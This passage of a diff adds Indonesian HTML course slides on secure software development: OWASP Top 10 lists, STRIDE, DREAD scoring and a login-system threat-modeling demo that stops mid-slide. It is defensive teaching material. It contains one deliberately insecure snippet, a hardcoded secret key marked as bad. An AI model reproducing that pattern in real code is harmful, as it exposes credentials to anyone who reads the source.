+        <div class="vt-head"><div class="icon">🔒</div><div><h4>Cryptographic Failures</h4><div class="cvss">OWASP A04:2025 Web (↓ dari #2) · M10:2024 Mobile</div></div></div>
+        <div class="vt-body">
+          <p>Kegagalan melindungi data sensitif dengan kriptografi yang kuat, termasuk data in-transit dan at-rest.</p>
+          <ul style="padding-left:15px;font-size:12.5px;color:#444;line-height:1.8">
+            <li><strong>Algoritma usang:</strong> MD5, SHA-1, DES, RC4</li>
+            <li><strong>Kunci hardcoded</strong> dalam kode sumber</li>
+            <li><strong>HTTP tanpa HTTPS</strong> untuk data sensitif</li>
+            <li><strong>Weak RNG</strong> untuk token/session ID</li>
+          </ul>
+          <div class="code"><span class="bad">// ❌ Hardcoded secret key</span>
+SECRET_KEY = "<span class="bad">mysecret123</span>"  <span class="comment"># di kode!</span>
+<span class="good"># ✅ Gunakan environment variable</span>
+import os
+SECRET_KEY = <span class="good">os.environ.get('SECRET_KEY')</span></div>
+          <div class="mit">🛡️ AES-256, SHA-256+, TLS 1.3, secrets manager (HashiCorp Vault, AWS Secrets Manager)</div>
+        </div>
+      </div>
+    </div>
+    <div class="card mt16" style="background:#fff8e1;border-left:4px solid var(--gold)">
+      <h3 style="font-size:14px;font-weight:700;margin-bottom:8px">📊 CWE Top 5 Most Dangerous (2024) — MITRE</h3>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <span class="badge b-red">#1 CWE-787: Out-of-bounds Write</span>
+        <span class="badge b-blue">#2 CWE-79: XSS</span>
+        <span class="badge b-orange">#3 CWE-89: SQL Injection</span>
+        <span class="badge b-purple">#4 CWE-416: Use-After-Free</span>
+        <span class="badge b-green">#5 CWE-78: OS Command Injection</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 4b – OWASP TOP 10 WEB 2025 & MOBILE 2024 ═══ -->
+<div class="slide" id="s4b" data-title="OWASP Top 10 Web 2025 & Mobile 2024">
+  <div class="sh">
+    <div class="lbl">Indikator 1 — Referensi Standar</div>
+    <h2>OWASP Top 10 Web 2025 &amp; Mobile Top 10 2024</h2>
+    <p>Standar industri global untuk kerawanan aplikasi web dan mobile — wajib dikuasai praktisi keamanan perangkat lunak</p>
+  </div>
+  <div class="sb">
+    <div class="two">
+      <!-- OWASP Web 2025 -->
+      <div class="card" style="border-top:4px solid #e65100;padding:16px">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
+          <div style="font-size:24px">🌐</div>
+          <div>
+            <h3 style="font-size:16px;font-weight:800;color:#e65100;margin:0">OWASP Top 10 Web 2025</h3>
+            <div style="font-size:11px;color:#888;margin-top:2px">Analisis 2,8 juta aplikasi · 2 kategori baru · owasp.org/Top10/2025</div>
+          </div>
+          <span style="margin-left:auto;background:#e65100;color:#fff;font-size:10px;padding:3px 8px;border-radius:4px;font-weight:700">TERBARU</span>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:5px;font-size:12.5px">
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#fff3e0;border-radius:6px">
+            <span style="font-weight:800;color:#e65100">A01</span><span>Broken Access Control</span><span style="font-size:10px;color:#888">tetap #1</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#e8f5e9;border-radius:6px">
+            <span style="font-weight:800;color:#2e7d32">A02</span><span>Security Misconfiguration</span><span style="font-size:10px;color:#2e7d32;font-weight:700">↑ dari #5</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#fce4ec;border-radius:6px">
+            <span style="font-weight:800;color:#c62828">A03</span><span>Software Supply Chain Failures</span><span style="font-size:10px;background:#c62828;color:#fff;padding:1px 5px;border-radius:3px">BARU</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#f3e5f5;border-radius:6px">
+            <span style="font-weight:800;color:#6a1b9a">A04</span><span>Cryptographic Failures</span><span style="font-size:10px;color:#c62828;font-weight:700">↓ dari #2</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#e3f2fd;border-radius:6px">
+            <span style="font-weight:800;color:#1565c0">A05</span><span>Injection (SQL, XSS, Command)</span><span style="font-size:10px;color:#c62828;font-weight:700">↓ dari #3</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#e8eaf6;border-radius:6px">
+            <span style="font-weight:800;color:#283593">A06</span><span>Insecure Design</span><span style="font-size:10px;color:#c62828;font-weight:700">↓ dari #4</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#f1f8e9;border-radius:6px">
+            <span style="font-weight:800;color:#33691e">A07</span><span>Authentication Failures</span><span style="font-size:10px;color:#888">tetap</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#e0f2f1;border-radius:6px">
+            <span style="font-weight:800;color:#00695c">A08</span><span>Software &amp; Data Integrity Failures</span><span style="font-size:10px;color:#888">tetap</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#fafafa;border-radius:6px">
+            <span style="font-weight:800;color:#455a64">A09</span><span>Security Logging &amp; <em>Alerting</em> Failures</span><span style="font-size:10px;color:#888">rename</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr auto;gap:4px;align-items:center;padding:5px 8px;background:#fce4ec;border-radius:6px">
+            <span style="font-weight:800;color:#c62828">A10</span><span>Mishandling of Exceptional Conditions</span><span style="font-size:10px;background:#c62828;color:#fff;padding:1px 5px;border-radius:3px">BARU</span></div>
+        </div>
+        <div style="margin-top:10px;font-size:11px;color:#555;background:#fff8e1;padding:6px 10px;border-radius:6px">
+          ⚠️ <strong>Perubahan kunci:</strong> SSRF (2021 A10) dikonsolidasi ke A01. Supply Chain menjadi kategori mandiri (#3). Security Misconfiguration naik dari #5 ke #2.
+        </div>
+      </div>
+
+      <!-- OWASP Mobile 2024 -->
+      <div class="card" style="border-top:4px solid #1a7a3c;padding:16px">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
+          <div style="font-size:24px">📱</div>
+          <div>
+            <h3 style="font-size:16px;font-weight:800;color:#1a7a3c;margin:0">OWASP Mobile Top 10 2024</h3>
+            <div style="font-size:11px;color:#888;margin-top:2px">Update pertama sejak 2016 · Berlaku Android &amp; iOS · owasp.org/www-project-mobile-top-10</div>
+          </div>
+          <span style="margin-left:auto;background:#1a7a3c;color:#fff;font-size:10px;padding:3px 8px;border-radius:4px;font-weight:700">2024</span>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:5px;font-size:12.5px">
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#e8f5e9;border-radius:6px">
+            <span style="font-weight:800;color:#1a7a3c">M1</span><span><strong>Improper Credential Usage</strong> — hardcoded keys, credentials di log</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#fce4ec;border-radius:6px">
+            <span style="font-weight:800;color:#c62828">M2</span><span><strong>Inadequate Supply Chain Security</strong> — library pihak ketiga tidak aman</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#e3f2fd;border-radius:6px">
+            <span style="font-weight:800;color:#1565c0">M3</span><span><strong>Insecure Authentication/Authorization</strong> — bypass login, IDOR</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#fff3e0;border-radius:6px">
+            <span style="font-weight:800;color:#e65100">M4</span><span><strong>Insufficient Input/Output Validation</strong> — injection via input mobile</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#f3e5f5;border-radius:6px">
+            <span style="font-weight:800;color:#6a1b9a">M5</span><span><strong>Insecure Communication</strong> — HTTP cleartext, SSL pinning bypass</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#e0f2f1;border-radius:6px">
+            <span style="font-weight:800;color:#00695c">M6</span><span><strong>Inadequate Privacy Controls</strong> — data PII bocor, excessive permissions</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#ede7f6;border-radius:6px">
+            <span style="font-weight:800;color:#4527a0">M7</span><span><strong>Insufficient Binary Protections</strong> — reverse engineering, APK repackaging</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#f1f8e9;border-radius:6px">
+            <span style="font-weight:800;color:#33691e">M8</span><span><strong>Security Misconfiguration</strong> — debug mode aktif, backup enable</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#e8eaf6;border-radius:6px">
+            <span style="font-weight:800;color:#283593">M9</span><span><strong>Insecure Data Storage</strong> — SharedPrefs plaintext, SQLite tidak terenkripsi</span></div>
+          <div style="display:grid;grid-template-columns:24px 1fr;gap:6px;align-items:start;padding:5px 8px;background:#fafafa;border-radius:6px">
+            <span style="font-weight:800;color:#455a64">M10</span><span><strong>Insufficient Cryptography</strong> — algoritma lemah, kunci hardcoded</span></div>
+        </div>
+        <div style="margin-top:10px;font-size:11px;color:#555;background:#e8f5e9;padding:6px 10px;border-radius:6px">
+          📌 <strong>Konteks Indonesia:</strong> M1 (credential leak) dan M9 (data storage) sangat relevan dengan UU PDP No. 27/2022 — pelanggaran dapat dikenai sanksi pidana.
+        </div>
+      </div>
+    </div>
+
+    <!-- Peta Silang Web vs Mobile -->
+    <div class="card mt16" style="background:#f8f9fa;padding:14px">
+      <h3 style="font-size:13px;font-weight:700;margin-bottom:10px;color:var(--blue)">🗺️ Pemetaan Silang: Kerawanan Web ↔ Mobile</h3>
+      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;font-size:12px">
+        <div style="background:#fff3e0;padding:8px;border-radius:6px;text-align:center"><strong>Injection</strong><br><span style="color:#e65100">Web: A05</span><br><span style="color:#1a7a3c">Mobile: M4</span></div>
+        <div style="background:#fce4ec;padding:8px;border-radius:6px;text-align:center"><strong>Auth Failure</strong><br><span style="color:#e65100">Web: A07</span><br><span style="color:#1a7a3c">Mobile: M3</span></div>
+        <div style="background:#f3e5f5;padding:8px;border-radius:6px;text-align:center"><strong>Crypto Weak</strong><br><span style="color:#e65100">Web: A04</span><br><span style="color:#1a7a3c">Mobile: M10</span></div>
+        <div style="background:#e8f5e9;padding:8px;border-radius:6px;text-align:center"><strong>Supply Chain</strong><br><span style="color:#e65100">Web: A03</span><br><span style="color:#1a7a3c">Mobile: M2</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 5 – PENGANTAR THREAT MODELING ═══ -->
+<div class="slide" id="s5" data-title="Pengantar Model Ancaman">
+  <div class="sh">
+    <div class="lbl">Indikator 2</div>
+    <h2>Pengantar Model Ancaman (Threat Modeling)</h2>
+    <p>Mengidentifikasi ancaman secara sistematis SEBELUM kode ditulis — prinsip Shift Left Security</p>
+  </div>
+  <div class="sb">
+    <div class="two" style="margin-bottom:16px">
+      <div class="card" style="background:linear-gradient(135deg,var(--darkblue),#1a3a8f);color:#fff">
+        <div style="font-size:12px;letter-spacing:1.5px;color:var(--gold);text-transform:uppercase;margin-bottom:8px">Definisi</div>
+        <p style="font-size:14px;line-height:1.7"><strong style="color:var(--lightgold)">Threat Modeling</strong> adalah proses terstruktur untuk mengidentifikasi, mengevaluasi, dan menangani potensi ancaman keamanan pada sistem sebelum atau selama pengembangan. Tujuannya adalah <em style="color:var(--lightgold)">memahami apa yang bisa salah dan bagaimana mencegahnya</em>.</p>
+        <p style="font-size:13px;margin-top:10px;opacity:.8">📌 Adam Shostack (Microsoft, 2014): "Threat modeling works to identify, communicate, and understand threats and mitigations within the context of protecting something of value."</p>
+      </div>
+      <div class="card">
+        <h3 class="sec">Mengapa Threat Modeling Penting?</h3>
+        <ul class="dot">
+          <li><strong>Hemat biaya:</strong> IBM menyatakan memperbaiki bug di fase design <strong>15× lebih murah</strong> daripada di production</li>
+          <li><strong>Proaktif:</strong> menemukan ancaman sebelum penyerang menemukannya</li>
+          <li><strong>Terstruktur:</strong> pendekatan sistematis, bukan hanya "instinct"</li>
+          <li><strong>Komunikasi:</strong> menyamakan persepsi dev, security, dan bisnis</li>
+          <li><strong>Compliance:</strong> dibutuhkan PCI-DSS, ISO 27001, UU PDP</li>
+        </ul>
+      </div>
+    </div>
+    <div class="lbl">4 Pertanyaan Kunci Threat Modeling (Shostack)</div>
+    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:4px">
+      <div class="card" style="border-top:4px solid #1565c0;text-align:center">
+        <div style="font-size:28px;margin-bottom:8px">🏗️</div>
+        <div style="font-size:12px;font-weight:700;color:#1565c0;margin-bottom:5px">Pertanyaan 1</div>
+        <p style="font-size:13.5px;font-weight:700">"Apa yang sedang kita bangun?"</p>
+        <p style="font-size:12px;color:#666;margin-top:5px">Buat diagram arsitektur, DFD, identifikasi aset berharga</p>
+      </div>
+      <div class="card" style="border-top:4px solid var(--danger);text-align:center">
+        <div style="font-size:28px;margin-bottom:8px">⚠️</div>
+        <div style="font-size:12px;font-weight:700;color:var(--danger);margin-bottom:5px">Pertanyaan 2</div>
+        <p style="font-size:13.5px;font-weight:700">"Apa yang bisa salah?"</p>
+        <p style="font-size:12px;color:#666;margin-top:5px">Gunakan STRIDE, PASTA, atau Attack Trees untuk enumerate threats</p>
+      </div>
+      <div class="card" style="border-top:4px solid var(--green);text-align:center">
+        <div style="font-size:28px;margin-bottom:8px">🛡️</div>
+        <div style="font-size:12px;font-weight:700;color:var(--green);margin-bottom:5px">Pertanyaan 3</div>
+        <p style="font-size:13.5px;font-weight:700">"Apa yang akan kita lakukan?"</p>
+        <p style="font-size:12px;color:#666;margin-top:5px">Tentukan mitigasi, accept risk, atau transfer risk</p>
+      </div>
+      <div class="card" style="border-top:4px solid var(--purple);text-align:center">
+        <div style="font-size:28px;margin-bottom:8px">✅</div>
+        <div style="font-size:12px;font-weight:700;color:var(--purple);margin-bottom:5px">Pertanyaan 4</div>
+        <p style="font-size:13.5px;font-weight:700">"Apakah kita berhasil?"</p>
+        <p style="font-size:12px;color:#666;margin-top:5px">Review, validasi, dan iterasi secara berkala</p>
+      </div>
+    </div>
+    <div class="card mt16" style="background:#f8f9fa;border-left:4px solid var(--gold)">
+      <p style="font-size:13px;color:#555"><strong>🛠️ Tools Populer:</strong> OWASP Threat Dragon (gratis, open source) · Microsoft Threat Modeling Tool · IriusRisk · MITRE ATT&amp;CK Navigator · draw.io untuk DFD manual</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 6 – STRIDE DETAIL ═══ -->
+<div class="slide" id="s6" data-title="Framework STRIDE">
+  <div class="sh">
+    <div class="lbl">Indikator 2 — STRIDE</div>
+    <h2>Framework STRIDE — Metodologi Threat Modeling Microsoft</h2>
+    <p>Dikembangkan Loren Kohnfelder &amp; Praerit Garg (Microsoft, 1999) — standar industri untuk enumerasi ancaman</p>
+  </div>
+  <div class="sb">
+    <div class="stride-grid">
+      <div class="stride-card">
+        <div class="stride-head ss"><div class="big">S</div><h3>Spoofing</h3><div class="full">Pemalsuan Identitas</div></div>
+        <div class="stride-body">
+          <p class="def">Penyerang berpura-pura menjadi entitas lain (user, sistem, komponen) untuk mendapatkan akses tidak sah.</p>
+          <div class="example"><strong>Contoh:</strong> Phishing login page, ARP spoofing, DNS spoofing, forged JWT token, impersonating API</div>
+          <p class="ctrl">🛡️ Kontrol: Authentication (MFA, PKI, digital signature)</p>
+        </div>
+      </div>
+      <div class="stride-card">
+        <div class="stride-head st"><div class="big">T</div><h3>Tampering</h3><div class="full">Modifikasi Data</div></div>
+        <div class="stride-body">
+          <p class="def">Memodifikasi data atau kode tanpa otorisasi — di memori, penyimpanan, atau saat transmisi.</p>
+          <div class="example"><strong>Contoh:</strong> SQL Injection modif data, man-in-the-middle, parameter tampering (?price=0), code injection</div>
+          <p class="ctrl">🛡️ Kontrol: Integrity (hash/checksum, digital signature, input validation, HTTPS)</p>
+        </div>
+      </div>
+      <div class="stride-card">
+        <div class="stride-head sr"><div class="big">R</div><h3>Repudiation</h3><div class="full">Penyangkalan Tindakan</div></div>
+        <div class="stride-body">
+          <p class="def">Pengguna menyangkal telah melakukan suatu tindakan karena tidak ada bukti yang cukup untuk membuktikannya.</p>
+          <div class="example"><strong>Contoh:</strong> "Saya tidak pernah melakukan transfer itu", log dihapus, timestamp dimanipulasi</div>
+          <p class="ctrl">🛡️ Kontrol: Non-repudiation (audit log, digital signature, secure timestamping)</p>
+        </div>
+      </div>
+      <div class="stride-card">
+        <div class="stride-head si"><div class="big">I</div><h3>Information Disclosure</h3><div class="full">Kebocoran Informasi</div></div>
+        <div class="stride-body">
+          <p class="def">Informasi sensitif terekspos ke pihak yang tidak berwenang, baik secara sengaja maupun tidak.</p>
+          <div class="example"><strong>Contoh:</strong> Stack trace di error page, data di URL params, verbose API response, insecure direct object reference</div>
+          <p class="ctrl">🛡️ Kontrol: Confidentiality (enkripsi, access control, masking, least privilege)</p>
+        </div>
+      </div>
+      <div class="stride-card">
+        <div class="stride-head sd"><div class="big">D</div><h3>Denial of Service</h3><div class="full">Penolakan Layanan</div></div>
+        <div class="stride-body">
+          <p class="def">Membuat sistem tidak dapat diakses oleh pengguna yang sah dengan menghabiskan resource.</p>
+          <div class="example"><strong>Contoh:</strong> DDoS attack, algorithmic complexity attack, resource exhaustion, XML bomb (billion laughs)</div>
+          <p class="ctrl">🛡️ Kontrol: Availability (rate limiting, CDN, load balancing, circuit breaker, input size validation)</p>
+        </div>
+      </div>
+      <div class="stride-card">
+        <div class="stride-head se"><div class="big">E</div><h3>Elevation of Privilege</h3><div class="full">Eskalasi Hak Akses</div></div>
+        <div class="stride-body">
+          <p class="def">Mendapatkan hak akses lebih tinggi dari yang diberikan — dari user biasa menjadi admin.</p>
+          <div class="example"><strong>Contoh:</strong> Privilege escalation via SUID binary (Linux), JWT role manipulation, sudo misconfig, kernel exploit</div>
+          <p class="ctrl">🛡️ Kontrol: Authorization (least privilege, RBAC, input validation, OS hardening)</p>
+        </div>
+      </div>
+    </div>
+    <div class="card mt12" style="background:var(--darkblue);color:#fff;padding:14px 18px">
+      <p style="font-size:13px"><strong style="color:var(--gold)">🔗 Pemetaan STRIDE → CIA Triad:</strong> &nbsp; S → Confidentiality &amp; Authentication &nbsp;|&nbsp; T → Integrity &nbsp;|&nbsp; R → Non-repudiation &nbsp;|&nbsp; I → Confidentiality &nbsp;|&nbsp; D → Availability &nbsp;|&nbsp; E → Authorization</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 7 – DREAD SCORING ═══ -->
+<div class="slide" id="s7" data-title="DREAD Scoring & Prioritas Risiko">
+  <div class="sh">
+    <div class="lbl">Indikator 2 — DREAD</div>
+    <h2>DREAD — Scoring Model untuk Prioritas Risiko Ancaman</h2>
+    <p>Dikembangkan Microsoft untuk memberikan skor kuantitatif pada setiap ancaman yang ditemukan STRIDE</p>
+  </div>
+  <div class="sb">
+    <div class="dread-grid">
+      <div class="dread-card dc1"><div class="dl">D</div><h4>Damage</h4><p>Seberapa besar kerusakan jika exploit berhasil?<br><br>1=Minimal · 5=Kritis</p></div>
+      <div class="dread-card dc2"><div class="dl">R</div><h4>Reproducibility</h4><p>Seberapa mudah serangan dapat direproduksi?<br><br>1=Sulit · 5=Selalu berhasil</p></div>
+      <div class="dread-card dc3"><div class="dl">E</div><h4>Exploitability</h4><p>Seberapa mudah exploit dilakukan?<br><br>1=Expert only · 5=Script kiddie</p></div>
+      <div class="dread-card dc4"><div class="dl">A</div><h4>Affected Users</h4><p>Berapa banyak user terdampak?<br><br>1=Satu user · 5=Semua user</p></div>
+      <div class="dread-card dc5"><div class="dl">D</div><h4>Discoverability</h4><p>Seberapa mudah ancaman ditemukan?<br><br>1=Sangat sulit · 5=Terlihat jelas</p></div>
+    </div>
+    <div class="dread-calc">
+      <h3>📊 Contoh Scoring — Sistem Login Web</h3>
+      <div class="dread-example">
+        <div class="th">Ancaman (STRIDE)</div>
+        <div class="th" style="text-align:center">D</div>
+        <div class="th" style="text-align:center">R</div>
+        <div class="th" style="text-align:center">E</div>
+        <div class="th" style="text-align:center">A</div>
+        <div class="th" style="text-align:center">D</div>
+        <div class="th" style="text-align:center">Total/5</div>
+      </div>
+      <div class="dread-example">
+        <div style="font-size:12px">SQL Injection (Tampering/Info Disc.)</div>
+        <div class="sc">5</div><div class="sc">5</div><div class="sc">4</div><div class="sc">5</div><div class="sc">3</div>
+        <div class="total" style="background:#c62828;color:#fff">22 🔴</div>
+      </div>
+      <div class="dread-example">
+        <div style="font-size:12px">Brute Force Login (Spoofing)</div>
+        <div class="sc">4</div><div class="sc">5</div><div class="sc">5</div><div class="sc">4</div><div class="sc">5</div>
+        <div class="total" style="background:#e65100;color:#fff">23 🔴</div>
+      </div>
+      <div class="dread-example">
+        <div style="font-size:12px">Verbose Error Message (Info Disc.)</div>
+        <div class="sc">2</div><div class="sc">5</div><div class="sc">5</div><div class="sc">3</div><div class="sc">5</div>
+        <div class="total" style="background:#f57c00;color:#fff">20 🟠</div>
+      </div>
+      <div class="dread-example">
+        <div style="font-size:12px">Missing Rate Limiting (DoS)</div>
+        <div class="sc">3</div><div class="sc">4</div><div class="sc">4</div><div class="sc">5</div><div class="sc">4</div>
+        <div class="total" style="background:#f57c00;color:#fff">20 🟠</div>
+      </div>
+      <div class="dread-example">
+        <div style="font-size:12px">No Audit Log (Repudiation)</div>
+        <div class="sc">2</div><div class="sc">3</div><div class="sc">4</div><div class="sc">2</div><div class="sc">2</div>
+        <div class="total" style="background:#2e7d32;color:#fff">13 🟢</div>
+      </div>
+      <div style="margin-top:12px;font-size:12px;color:rgba(255,255,255,.6)">Skala: 🔴 ≥ 20 = High Priority &nbsp;|&nbsp; 🟠 15–19 = Medium &nbsp;|&nbsp; 🟢 ≤ 14 = Low</div>
+    </div>
+    <div class="card mt12" style="background:#fff8e1;border-left:4px solid var(--gold)">
+      <p style="font-size:13px;color:#555"><strong>💡 Catatan:</strong> DREAD bersifat subjektif dan sudah diretire secara resmi oleh Microsoft untuk penggunaan internal, namun masih banyak digunakan sebagai framework pembelajaran. Alternatif modern: <strong>CVSS v3.1/v4.0</strong> (lebih objektif, digunakan NVD) atau <strong>OWASP Risk Rating Methodology</strong>.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 8 – DFD & PROSES THREAT MODELING ═══ -->
+<div class="slide" id="s8" data-title="Proses Penyusunan Model Ancaman">
+  <div class="sh">
+    <div class="lbl">Indikator 2 — Proses</div>
+    <h2>Proses Penyusunan Model Ancaman Step-by-Step</h2>
+    <p>Panduan praktis menyusun threat model dari nol menggunakan DFD + STRIDE</p>
+  </div>
+  <div class="sb">
+    <div class="two">
+      <div>
+        <div class="lbl">Langkah-Langkah</div>
+        <div class="steps mt12">
+          <div class="step">
+            <div class="step-num-wrap">
+              <div class="step-num" style="background:#1565c0">1</div>
+              <div class="step-line"></div>
+            </div>
+            <div class="step-body">
+              <h4>Dekomposisi Sistem → Buat DFD</h4>
+              <p>Gambar Data Flow Diagram: identifikasi <strong>External Entities</strong> (pengguna, sistem luar), <strong>Processes</strong> (komponen aplikasi), <strong>Data Stores</strong> (DB, file), dan <strong>Data Flows</strong> (aliran data antar komponen).</p>
+              <ul>
+                <li>Tandai <strong>Trust Boundaries</strong> (garis merah putus-putus)</li>
+                <li>Setiap data flow yang melewati trust boundary = potential attack surface</li>
+              </ul>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num-wrap">
+              <div class="step-num" style="background:#c62828">2</div>
+              <div class="step-line"></div>
+            </div>
+            <div class="step-body">
+              <h4>Identifikasi Ancaman dengan STRIDE</h4>
+              <p>Untuk setiap elemen DFD, terapkan STRIDE secara sistematis. Buat daftar ancaman untuk setiap kategori.</p>
+              <ul>
+                <li>External Entity → fokus pada Spoofing</li>
+                <li>Process → Tampering, Elevation of Privilege</li>
+                <li>Data Store → Information Disclosure, Tampering</li>
+                <li>Data Flow → Tampering, Information Disclosure, DoS</li>
+              </ul>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num-wrap">
+              <div class="step-num" style="background:#e65100">3</div>
+              <div class="step-line"></div>
+            </div>
+            <div class="step-body">
+              <h4>Scoring &amp; Prioritasi dengan DREAD</h4>
+              <p>Hitung skor DREAD untuk setiap ancaman. Urutkan dari skor tertinggi ke terendah untuk menentukan prioritas penanganan.</p>
+              <ul>
+                <li>Skor ≥ 20: High → wajib ditangani segera</li>
+                <li>Skor 15–19: Medium → ditangani dalam sprint berikutnya</li>
+                <li>Skor &lt; 15: Low → masuk backlog/accepted risk</li>
+              </ul>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num-wrap">
+              <div class="step-num" style="background:#2e7d32">4</div>
+              <div class="step-line"></div>
+            </div>
+            <div class="step-body">
+              <h4>Tentukan Mitigasi</h4>
+              <p>Untuk setiap ancaman High dan Medium, tentukan kontrol keamanan spesifik yang akan diimplementasikan.</p>
+              <ul>
+                <li>Rujuk ke OWASP Cheat Sheet Series untuk mitigasi spesifik</li>
+                <li>Dokumentasikan dalam Threat Model Report</li>
+                <li>Update model secara berkala saat ada perubahan arsitektur</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="lbl">Simbol DFD Standar</div>
+        <div class="card mt12" style="margin-bottom:14px">
+          <div style="display:flex;flex-direction:column;gap:8px;font-size:13px">
+            <div style="display:flex;gap:12px;align-items:center">
+              <div style="width:50px;height:40px;border:2.5px solid #555;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0">👤</div>
+              <div><strong>External Entity</strong> — kotak persegi. Entitas di luar sistem (user, sistem eksternal)</div>
+            </div>
+            <div style="display:flex;gap:12px;align-items:center">
+              <div style="width:50px;height:40px;border-radius:50%;border:2.5px solid #1565c0;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0">⚙️</div>
+              <div><strong>Process</strong> — lingkaran/elips. Komponen yang memproses data</div>
+            </div>
+            <div style="display:flex;gap:12px;align-items:center">
+              <div style="width:50px;height:40px;border-bottom:2.5px solid #2e7d32;border-top:2.5px solid #2e7d32;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0">🗄️</div>
+              <div><strong>Data Store</strong> — dua garis horizontal. Database, file, cache</div>
+            </div>
+            <div style="display:flex;gap:12px;align-items:center">
+              <div style="width:50px;height:40px;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0">→</div>
+              <div><strong>Data Flow</strong> — panah. Aliran data antar elemen</div>
+            </div>
+            <div style="display:flex;gap:12px;align-items:center">
+              <div style="width:50px;height:2px;background:rgba(220,50,50,.7);border:1px dashed red;flex-shrink:0"></div>
+              <div><strong>Trust Boundary</strong> — garis putus-putus merah. Batas kepercayaan</div>
+            </div>
+          </div>
+        </div>
+        <div class="lbl">Tools Threat Modeling</div>
+        <div class="card mt12">
+          <ul class="dot">
+            <li><strong>OWASP Threat Dragon</strong> — open source, web-based, gratis (threatdragon.com)</li>
+            <li><strong>Microsoft Threat Modeling Tool</strong> — gratis untuk Windows, STRIDE-based</li>
+            <li><strong>draw.io / Miro</strong> — DFD manual, kolaboratif</li>
+            <li><strong>IriusRisk</strong> — enterprise, otomatis dari kode</li>
+            <li><strong>pytm</strong> — threat modeling sebagai kode (Python)</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SLIDE 9 – DEMO THREAT MODELING ═══ -->
+<div class="slide" id="s9" data-title="Demo: Threat Modeling Sistem Login Web">
+  <div class="sh">
+    <div class="lbl">Indikator 2 — Demo</div>
+    <h2>Demo: Threat Modeling Sistem Login Web Sederhana</h2>
+    <p>Penerapan lengkap DFD + STRIDE + DREAD pada studi kasus nyata</p>
+  </div>
+  <div class="sb">
+    <div class="lbl">Step 1: Data Flow Diagram (DFD)</div>
+    <div class="dfd-wrap mt12">
+      <div class="dfd-title">🗺️ DFD — Sistem Login Web (Level 1)</div>
+      <div class="dfd-row">
+        <div class="dfd-node dfd-ext">
+          <div class="nn">👤</div>
+          <div class="nl">Pengguna</div>
+          <div class="dfd-flow-label">(External Entity)</div>
+        </div>
+        <div>
+          <div class="dfd-arrow">→</div>
+          <div class="dfd-flow-label" style="color:rgba(255,255,255,.5);font-size:10px">Credentials<br>(HTTPS)</div>
+        </div>
+        <div class="dfd-node dfd-proc">
+          <div class="nn">🌐</div>
+          <div class="nl">Web Frontend</div>
+          <div class="dfd-flow-label">(Process 1)</div>
+        </div>
+        <div>
+          <div class="dfd-arrow">→</div>
+          <div class="dfd-flow-label" style="color:rgba(255,255,255,.5);font-size:10px">API Request</div>
+        </div>
+        <div class="dfd-node dfd-proc">
+          <div class="nn">⚙️</div>
+          <div class="nl">Auth Service</div>
+          <div class="dfd-flow-label">(Process 2)</div>
+        </div>
+        <div>
+          <div class="dfd-arrow">→</div>
+          <div class="dfd-flow-label" style="color:rgba(255,255,255,.5);font-size:10px">SQL Query</div>
+        </div>
+        <div class="dfd-node dfd-db">
+          <div class="nn">🗄️</div>
+          <div class="nl">User DB</div>
+          <div class="dfd-flow-label">(Data Store)</div>
+        </div>
+      </div>
+      <div class="tb-line"></div>
+      <div style="text-align:center;margin-top:6px">
